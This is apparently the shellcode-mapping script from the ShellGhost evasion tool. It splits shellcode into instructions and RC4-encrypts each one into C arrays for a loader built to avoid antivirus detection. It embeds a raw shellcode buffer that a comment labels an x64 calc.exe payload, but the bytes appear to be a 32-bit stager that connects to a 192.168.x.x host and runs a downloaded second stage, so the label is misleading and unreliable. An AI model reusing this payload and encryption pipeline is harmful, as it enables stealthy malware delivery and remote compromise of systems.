# ----------------------------------------------------------------------------------------------#
# Author:   Angelo Frasca Caccia (lem0nSec_)                                                    #
# Date:     16/01/2023                                                                          #
# Title:    ShellGhost_mapping.py (shellcode mapping script for ShellGhost)                     #
# Website:  https://github.com/lem0nSec/ShellGhost                                              #
# Credits:  https://github.com/fishstiqz/nasmshell (nasmshell)                                  #
#           https://gist.github.com/hsauers5/491f9dde975f1eaa97103427eda50071 (RC4 encryption)  #
# ----------------------------------------------------------------------------------------------#



import subprocess
import tempfile
import sys
import os
from typing import Iterator
from math import floor


# msfvenom -p windows/x64/exec cmd=calc.exe EXITFUNC=thread -e generic/none -f python
buf =  b""
buf += b"\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x89\xe5\x64\x8b"
buf += b"\x52\x30\x8b\x52\x0c\x8b\x52\x14\x31\xff\x0f\xb7\x4a"
buf += b"\x26\x8b\x72\x28\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20"
buf += b"\xc1\xcf\x0d\x01\xc7\x49\x75\xef\x52\x57\x8b\x52\x10"
buf += b"\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4c\x01"
buf += b"\xd0\x50\x8b\x58\x20\x01\xd3\x8b\x48\x18\x85\xc9\x74"
buf += b"\x3c\x31\xff\x49\x8b\x34\x8b\x01\xd6\x31\xc0\xc1\xcf"
buf += b"\x0d\xac\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d"
buf += b"\x24\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b"
buf += b"\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
buf += b"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b"
buf += b"\x12\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00\x00\x68"
buf += b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\x89\xe8\xff"
buf += b"\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80"
buf += b"\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x4f\x85\x68\x02"
buf += b"\x00\x15\xb3\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50"
buf += b"\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68"
buf += b"\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08"
buf += b"\x75\xec\xe8\x67\x00\x00\x00\x6a\x00\x6a\x04\x56\x57"
buf += b"\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x36\x8b"
buf += b"\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58"
buf += b"\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68"
buf += b"\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68"
buf += b"\x00\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff"
buf += b"\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c"
buf += b"\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff\xff\x01"
buf += b"\xc3\x29\xc6\x75\xc1\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00"
buf += b"\x53\xff\xd5"


# RC4 key
key = b"\x3b\x21\xff\x41\xe3"



def key_scheduling(key: bytes) -> list[int]:
    sched = [i for i in range(0, 256)]

    i = 0
    for j in range(0, 256):
        i = (i + sched[j] + key[j % len(key)]) % 256
        tmp = sched[j]
        sched[j] = sched[i]
        sched[i] = tmp

    return sched


def stream_generation(sched: list[int]) -> Iterator[bytes]:
    i, j = 0, 0
    while True:
        i = (1 + i) % 256
        j = (sched[i] + j) % 256
        tmp = sched[j]
        sched[j] = sched[i]
        sched[i] = tmp
        yield sched[(sched[i] + sched[j]) % 256]        


def encrypt(plaintext: bytes, key: bytes) -> bytes:
    sched = key_scheduling(key)
    key_stream = stream_generation(sched)
    
    ciphertext = b''
    for char in plaintext:
        enc = char ^ next(key_stream)
        ciphertext += bytes([enc])
        
    return ciphertext


def parse(buf_out):
    cur_op = []
    cur_offset = []
    cur_instr = []

    for line in buf_out.splitlines():
        line = line.strip()
        elems = line.split(None, 2)
        
        if len(elems) == 3:
            cur_op.append(elems[1])
            cur_offset.append(elems[0])
            cur_instr.append(elems[2])

        elif len(elems) == 1 and elems[0][0] == '-':
            cur_op[-1] += elems[0][1:]

    return cur_offset,cur_instr, cur_op


def disassemble(binfile, bits):
    proc = subprocess.Popen(["ndisasm", "-b%u"%(bits), binfile], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    buf_out, buf_err = proc.communicate()
    buf_out = buf_out.decode()
    buf_err = buf_err.decode()
    return parse(buf_out)


def createBinfile(binfd, binfile):
    binfd, binfile = tempfile.mkstemp()
    os.write(binfd, buf)
    os.close(binfd)
    return binfile


if __name__ == "__main__":

    global usage
    usage = f"Usage: python {sys.argv[0]} --help"
    
    if len(sys.argv) < 2:
        print(usage)
        sys.exit(0)

    if sys.argv[1] == "--help":
        print("-1: print C struct shellcode mapping")
        print("-2: print C struct shellcode mapping + instructions")
        print("-3: print Python variables to encrypt")
        print("-4: print encrypted shellcode in C format")
        sys.exit(0)

    mod = sys.argv[1]
    if mod:
        try:
            bits = 64   # 64 bit shellcode
            binfile = None

            if mod == "-1":
                binfd = None
                binfile = createBinfile(binfd, binfile)
                cur_offset = ((disassemble(binfile, bits))[0])
                cur_instr = ((disassemble(binfile, bits))[1])
                cur_op = ((disassemble(binfile, bits))[2])
                i = 0
                for opcode in cur_op:
                    print(f"instruction[{i}].RVA = {str(int(cur_offset[i], 16))};\n" + f"instruction[{i}].quota = {str(floor(len(opcode) / 2))};")
                    i += 1
            
            elif mod == "-2":
                binfd = None
                binfile = createBinfile(binfd, binfile)
                cur_offset = ((disassemble(binfile, bits))[0])
                cur_instr = ((disassemble(binfile, bits))[1])
                cur_op = ((disassemble(binfile, bits))[2])
                i = 0
                for opcode in cur_op:
                    print(f"instruction[{i}].RVA = {str(int(cur_offset[i], 16))};\n" + f"instruction[{i}].quota = {str(floor(len(opcode) / 2))};" + f"      {cur_instr[i]}")
                    i += 1
            
            elif mod == "-3":
                binfd = None
                binfile = createBinfile(binfd, binfile)
                cur_offset = ((disassemble(binfile, bits))[0])
                cur_instr = ((disassemble(binfile, bits))[1])
                cur_op = ((disassemble(binfile, bits))[2])
                alca = []
                for num in range(len(cur_op)):
                    for i in cur_op[num]:
                        alca.append(i)
                    ops = [''.join(alca[i:i+2]) for i in range(0, len(alca), 2)]
                    print(f"buf{num} = b\"\\x" + "\\x".join(ops) + "\"")
                    alca = []
            
            elif mod == "-4":
                binfd = None
                binfile = createBinfile(binfd, binfile)
                cur_offset = ((disassemble(binfile, bits))[0])
                cur_instr = ((disassemble(binfile, bits))[1])
                cur_op = ((disassemble(binfile, bits))[2])
                instrCount = 0
                alca = []
                a = []
                for num in range(len(cur_op)):
                    for i in cur_op[num]:
                        alca.append(i)
                    ops = [''.join(alca[i:i+2]) for i in range(0, len(alca), 2)]
                    var = f"b\"\\x" + "\\x".join(ops) + "\""
                    result = encrypt(eval(var), key)
                    for s in result:
                        a.append(hex(s))
                    instrCount += 1
                    alca = []
                print("\nunsigned char sh[] = { " + ", ".join(a) + " };")
                print(f"\nstatic CRYPT_BYTES_QUOTA instruction[{instrCount}];")
                print("static DWORD instructionCount = " + str(instrCount) + ";")

            else:
                print(usage)
                exit()

        finally:
            if binfile:
                os.unlink(binfile)
